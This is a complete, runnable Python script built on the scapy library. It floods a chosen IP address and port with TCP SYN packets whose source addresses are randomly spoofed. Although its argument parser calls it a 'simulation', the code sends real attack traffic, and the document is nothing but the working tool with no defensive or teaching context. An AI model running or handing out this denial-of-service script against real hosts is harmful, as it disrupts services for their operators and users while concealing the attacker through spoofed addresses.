import argparse
from scapy.all import IP, TCP, send
import random

def syn_flood(target_ip, target_port, packet_count):
    print(f"Starting TCP SYN Flood attack on {target_ip}:{target_port} with {packet_count} packets...")

    for _ in range(packet_count):
        # Crafting a TCP SYN packet with a random source IP and port
        ip_layer = IP(src=generate_random_ip(), dst=target_ip)
        tcp_layer = TCP(sport=random.randint(1024, 65535), dport=target_port, flags="S")
        packet = ip_layer / tcp_layer

        # Send the packet
        send(packet, verbose=False)

    print("TCP SYN Flood attack completed.")

def generate_random_ip():
    # Generate a random IP address
    return f"{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}"

def main():
    parser = argparse.ArgumentParser(description="TCP SYN Flood Attack Simulation")
    parser.add_argument("-t", "--target", type=str, help="Target IP address", required=True)
    parser.add_argument("-p", "--port", type=int, help="Target port", required=True)
    parser.add_argument("-c", "--count", type=int, help="Number of SYN packets to send", required=True)

    args = parser.parse_args()

    syn_flood(args.target, args.port, args.count)

if __name__ == "__main__":
    main()
